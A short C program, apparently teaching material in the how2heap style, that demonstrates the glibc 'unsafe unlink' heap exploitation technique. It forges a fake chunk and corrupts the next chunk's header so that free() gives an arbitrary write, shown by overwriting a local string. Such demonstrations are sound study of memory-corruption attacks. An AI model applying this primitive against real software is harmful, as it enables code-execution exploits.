#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main() {
	chunk0_ptr = (uint64_t*) malloc(0x80);				//chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(0x80);	//chunk1
	fprintf(stderr, "chunk0_ptr: %p -> %p\n", &chunk0_ptr, chunk0_ptr);
	fprintf(stderr, "victim chunk: %p\n\n", chunk1_ptr);

	/* pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
       chunk0_ptr[1] = 0x0; // or 0x8, 0x80 */
	// pass this check: (P->fd->bk != P || P->bk->fd != P) == False
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr - 0x18;		// fake chunk in chunk0
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr - 0x10;
	fprintf(stderr, "fake fd: %p = &chunk0_ptr-0x18\n", (void *) chunk0_ptr[2]);
	fprintf(stderr, "fake bk: %p = &chunk0_ptr-0x10\n\n", (void*) chunk0_ptr[3]);

	uint64_t *chunk1_hdr = (void *)chunk1_ptr - 0x10;	// overwrite chunk1
	chunk1_hdr[0] = 0x80;								// prev_size
	chunk1_hdr[1] &= ~1;								// PREV_INUSE

	/*
	int *t[10], i;									// tcache
	for (i = 0; i < 7; i++) {
		t[i] = malloc(0x80);
	}
	for (i = 0; i < 7; i++) {
		free(t[i]);
	} */

	free(chunk1_ptr);								// unlink

	char victim_string[8] = "AAAAAAA";
	chunk0_ptr[3] = (uint64_t) victim_string;			// overwrite itself
	fprintf(stderr, "old value: %s\n", victim_string);

	chunk0_ptr[0] = 0x42424242424242LL;				// overwrite victim_string
	fprintf(stderr, "new Value: %s\n", victim_string);
}
